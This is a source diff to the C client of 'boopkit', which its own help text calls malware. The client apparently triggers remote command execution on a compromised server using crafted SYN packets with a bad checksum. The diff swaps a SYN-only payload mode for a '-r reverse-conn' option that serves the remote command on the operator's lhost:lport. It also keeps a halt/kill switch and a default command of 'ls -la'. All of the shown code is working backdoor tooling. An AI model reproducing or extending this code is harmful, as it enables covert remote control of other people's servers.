@@ -53,7 +53,7 @@ void usage() {
       "-9, halt/kill      Halt or kill the boopkit malware on a server.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-c, execute        Remote command to exec : ls -la\n");
-  boopprintf("-p, payload-only   Boop with only SYN. No reverse conn.\n");
+  boopprintf("-r, reverse-conn   Serve the RCE on lhost:lport after a boop.\n");
   boopprintf("-h, help           Print help and usage.\n");
   boopprintf("\n");
   exit(0);
@@ -68,7 +68,7 @@ struct config {
   char lport[MAX_ARG_LEN];
   char rce[MAX_RCE_SIZE];
   int halt;
-  int payload;
+  int reverseconn;
 } cfg;
 
 // clisetup will initialize the config struct for the program
@@ -80,7 +80,7 @@ void clisetup(int argc, char **argv) {
   strncpy(cfg.rport, "22", MAX_ARG_LEN);
   strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
   cfg.halt = 0;
-  cfg.payload = 0;
+  cfg.reverseconn = 0;
   for (int i = 0; i < argc; i++) {
     if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1) {
       strncpy(cfg.lport, argv[i + 1], MAX_ARG_LEN);
@@ -105,8 +105,8 @@ void clisetup(int argc, char **argv) {
         case 'q':
           quiet = 1;
           break;
-        case 'p':
-          cfg.payload = 1;
+        case 'r':
+          cfg.reverseconn = 1;
           break;
         case '9':
           cfg.halt = 1;
@@ -203,7 +203,7 @@ int main(int argc, char **argv) {
   char *packet;
   char payload[MAX_RCE_SIZE];
   if (cfg.halt) {
-    cfg.payload = 1;
+    cfg.reverseconn = 0;
     strncpy(cfg.rce, BOOPKIT_RCE_CMD_HALT,
             MAX_RCE_SIZE);  // Overwrite command with halt command!
   }
@@ -214,9 +214,6 @@ int main(int argc, char **argv) {
   boopprintf("  -> *[RCE]     : %s\n", cfg.rce);
   boopprintf("  -> *[Local]   : %s:%s\n", cfg.lhost, cfg.lport);
   boopprintf("  -> *[Remote]  : %s:%s\n", cfg.rhost, cfg.rport);
-  if (cfg.payload) {
-    boopprintf("  -> *[Payload] : Sending (RCE, *bad csum) SYN only.\n");
-  }
   printf("================================================================\n");
 
   // ===========================================================================
@@ -257,11 +254,6 @@ int main(int argc, char **argv) {
   close(sock1);
   // ===========================================================================
 
-  if (cfg.payload) {
-    printf(
-        "================================================================\n");
-    return 0;
-  }
 
   // ===========================================================================
   // 2. TCP SOCK_STREAM Connection
@@ -337,9 +329,10 @@ int main(int argc, char **argv) {
              cfg.rport);
   close(sock3);
   // ===========================================================================
-  boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost,
-             cfg.lport);
-  if (!cfg.payload) {
+
+  if (cfg.reverseconn) {
+    boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost,
+               cfg.lport);
     int errno;
     errno = serverce(saddrstr, cfg.rce);
     if (errno != 0) {
